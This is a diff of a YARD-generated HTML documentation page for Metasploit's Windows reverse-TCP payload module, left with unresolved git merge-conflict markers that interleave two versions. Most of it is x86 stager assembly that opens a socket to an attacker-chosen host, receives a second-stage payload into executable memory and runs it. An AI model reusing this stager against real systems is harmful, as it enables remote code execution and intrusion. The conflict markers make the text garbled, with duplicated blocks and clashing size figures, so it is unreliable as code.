@@ -610,6 +610,7 @@ certain payloads if requested.</p>
 246
 247
 248
+<<<<<<< HEAD
 249
 250
 251
@@ -629,6 +630,9 @@ certain payloads if requested.</p>
 265
 266
 267</pre>
+=======
+249</pre>
+>>>>>>> origin/gh-pages
     </td>
     <td>
       <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/reverse_tcp.rb', line 98</span>
@@ -646,6 +650,7 @@ certain payloads if requested.</p>
     ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
 
     reverse_tcp:
+<<<<<<< HEAD
       push &#39;32&#39;               ; Push the bytes &#39;ws2_32&#39;,0,0 onto the stack.
       push &#39;ws2_&#39;             ; ...
       push esp                ; Push a pointer to the &quot;ws2_32&quot; string on the stack.
@@ -692,11 +697,58 @@ certain payloads if requested.</p>
     handle_connect_failure:
       ; decrement our attempt count and try again
       dec [esi+8]
+=======
+      push 0x00003233        ; Push the bytes &#39;ws2_32&#39;,0,0 onto the stack.
+      push 0x5F327377        ; ...
+      push esp               ; Push a pointer to the &quot;ws2_32&quot; string on the stack.
+      push 0x0726774C        ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )
+      call ebp               ; LoadLibraryA( &quot;ws2_32&quot; )
+
+      mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
+      sub esp, eax           ; alloc some space for the WSAData structure
+      push esp               ; push a pointer to this stuct
+      push eax               ; push the wVersionRequested parameter
+      push 0x006B8029        ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )
+      call ebp               ; WSAStartup( 0x0190, &amp;WSAData );
+
+    create_socket:
+      push eax               ; if we succeed, eax will be zero, push zero for the flags param.
+      push eax               ; push null for reserved parameter
+      push eax               ; we do not specify a WSAPROTOCOL_INFO structure
+      push eax               ; we do not specify a protocol
+      inc eax                ;
+      push eax               ; push SOCK_STREAM
+      inc eax                ;
+      push eax               ; push AF_INET
+      push 0xE0DF0FEA        ; hash( &quot;ws2_32.dll&quot;, &quot;WSASocketA&quot; )
+      call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
+      xchg edi, eax          ; save the socket for later, don&#39;t care about the value of eax after this
+
+    set_address:
+      push </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_retry_count'>retry_count</span><span class='embexpr_end'>}</span><span class='tstring_content'>    ; retry counter
+      push </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_encoded_host'>encoded_host</span><span class='embexpr_end'>}</span><span class='tstring_content'>   ; host in little-endian format
+      push </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_encoded_port'>encoded_port</span><span class='embexpr_end'>}</span><span class='tstring_content'>   ; family AF_INET and port number
+      mov esi, esp           ; save pointer to sockaddr struct
+
+    try_connect:
+      push 16                ; length of the sockaddr struct
+      push esi               ; pointer to the sockaddr struct
+      push edi               ; the socket
+      push 0x6174A599        ; hash( &quot;ws2_32.dll&quot;, &quot;connect&quot; )
+      call ebp               ; connect( s, &amp;sockaddr, 16 );
+
+      test eax,eax           ; non-zero means a failure
+      jz connected
+
+    handle_failure:
+      dec dword [esi+8]
+>>>>>>> origin/gh-pages
       jnz try_connect
   </span><span class='tstring_end'>^</span></span>
 
   <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:exitfunk</span><span class='rbracket'>]</span>
     <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+<<<<<<< HEAD
     failure:
       call exitfunk
     </span><span class='tstring_end'>^</span></span>
@@ -713,12 +765,38 @@ certain payloads if requested.</p>
     ; the UUID stuff if required.
     connected:
   </span><span class='tstring_end'>^</span></span>
+=======
+      failure:
+        call exitfunk
+      </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      failure:
+        push 0x56A2B5F0        ; hardcoded to exitprocess for size
+        call ebp
+      </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+  <span class='comment'># TODO: Rewind the stack, free memory, try again
+</span><span class='embdoc_beg'>=begin
+</span><span class='embdoc'>    if opts[:reliable]
+</span><span class='embdoc'>      asm &lt;&lt; %Q^
+</span><span class='embdoc'>         reconnect:
+</span><span class='embdoc'>
+</span><span class='embdoc'>        ^
+</span><span class='embdoc'>    end
+</span><span class='embdoc_end'>=end
+</span>
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    connected:
+    </span><span class='tstring_end'>^</span></span>
+>>>>>>> origin/gh-pages
 
   <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_asm_send_uuid'>asm_send_uuid</span> <span class='kw'>if</span> <span class='id identifier rubyid_include_send_uuid'>include_send_uuid</span>
 
   <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
     recv:
       ; Receive the size of the incoming second stage...
+<<<<<<< HEAD
       push 0                  ; flags
       push 4                  ; length = sizeof( DWORD );
       push esi                ; the 4 byte buffer on the stack to hold the second stage length
@@ -734,10 +812,28 @@ certain payloads if requested.</p>
       cmp eax, 0
       jle cleanup_socket
     </span><span class='tstring_end'>^</span></span>
+=======
+      push 0                 ; flags
+      push 4                 ; length = sizeof( DWORD );
+      push esi               ; the 4 byte buffer on the stack to hold the second stage length
+      push edi               ; the saved socket
+      push 0x5FC8D902        ; hash( &quot;ws2_32.dll&quot;, &quot;recv&quot; )
+      call ebp               ; recv( s, &amp;dwLength, 4, 0 );
+  </span><span class='tstring_end'>^</span></span>
+
+  <span class='comment'># Check for a failed recv() call
+</span>  <span class='comment'># TODO: Try again by jmping to reconnect
+</span>  <span class='kw'>if</span> <span class='id identifier rubyid_reliable'>reliable</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+        cmp eax, 0
+        jle failure
+      </span><span class='tstring_end'>^</span></span>
+>>>>>>> origin/gh-pages
   <span class='kw'>end</span>
 
   <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
       ; Alloc a RWX buffer for the second stage
+<<<<<<< HEAD
       mov esi, [esi]          ; dereference the pointer to the second stage length
       push 0x40               ; PAGE_EXECUTE_READWRITE
       push 0x1000             ; MEM_COMMIT
@@ -786,15 +882,50 @@ certain payloads if requested.</p>
 
       ; try again
       jmp create_socket
+=======
+      mov esi, [esi]         ; dereference the pointer to the second stage length
+      push 0x40              ; PAGE_EXECUTE_READWRITE
+      push 0x1000            ; MEM_COMMIT
+      push esi               ; push the newly recieved second stage length.
+      push 0                 ; NULL as we dont care where the allocation is.
+      push 0xE553A458        ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAlloc&quot; )
+      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+      ; Receive the second stage and execute it...
+      xchg ebx, eax          ; ebx = our new memory address for the new stage
+      push ebx               ; push the address of the new stage so we can return into it
+
+    read_more:               ;
+      push 0                 ; flags
+      push esi               ; length
+      push ebx               ; the current address into our second stage&#39;s RWX buffer
+      push edi               ; the saved socket
+      push 0x5FC8D902        ; hash( &quot;ws2_32.dll&quot;, &quot;recv&quot; )
+      call ebp               ; recv( s, buffer, length, 0 );
+  </span><span class='tstring_end'>^</span></span>
+
+  <span class='comment'># Check for a failed recv() call
+</span>  <span class='comment'># TODO: Try again by jmping to reconnect
+</span>  <span class='kw'>if</span> <span class='id identifier rubyid_reliable'>reliable</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      cmp eax, 0
+      jle failure
+>>>>>>> origin/gh-pages
     </span><span class='tstring_end'>^</span></span>
   <span class='kw'>end</span>
 
   <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+<<<<<<< HEAD
     read_successful:
       add ebx, eax            ; buffer += bytes_received
       sub esi, eax            ; length -= bytes_received, will set flags
       jnz read_more           ; continue if we have more to read
       ret                     ; return into the second stage
+=======
+      add ebx, eax           ; buffer += bytes_received
+      sub esi, eax           ; length -= bytes_received, will set flags
+      jnz read_more          ; continue if we have more to read
+      ret                    ; return into the second stage
+>>>>>>> origin/gh-pages
   </span><span class='tstring_end'>^</span></span>
 
   <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:exitfunk</span><span class='rbracket'>]</span>
@@ -1023,11 +1154,19 @@ certain payloads if requested.</p>
   <span class='comment'># Start with our cached default generated size
 </span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>=</span> <span class='id identifier rubyid_cached_size'>cached_size</span>
 
+<<<<<<< HEAD
   <span class='comment'># EXITFUNK &#39;thread&#39; is the biggest by far, adds 29 bytes.
 </span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>29</span>
 
   <span class='comment'># Reliability adds some bytes!
 </span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>44</span>
+=======
+  <span class='comment'># EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
+</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>31</span>
+
+  <span class='comment'># Reliability adds 10 bytes for recv error checks
+</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>10</span>
+>>>>>>> origin/gh-pages
 
   <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='id identifier rubyid_uuid_required_size'>uuid_required_size</span> <span class='kw'>if</span> <span class='id identifier rubyid_include_send_uuid'>include_send_uuid</span>
 
@@ -1074,9 +1213,15 @@ certain payloads if requested.</p>
 </div>
 
     <div id="footer">
+<<<<<<< HEAD
   Generated on Tue Dec 22 22:32:07 2015 by
   <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
   0.8.7.6 (ruby-2.1.7).
+=======
+  Generated on Tue Sep  1 22:32:50 2015 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.8.7.6 (ruby-2.1.5).
+>>>>>>> origin/gh-pages
 </div>
 
   </body>
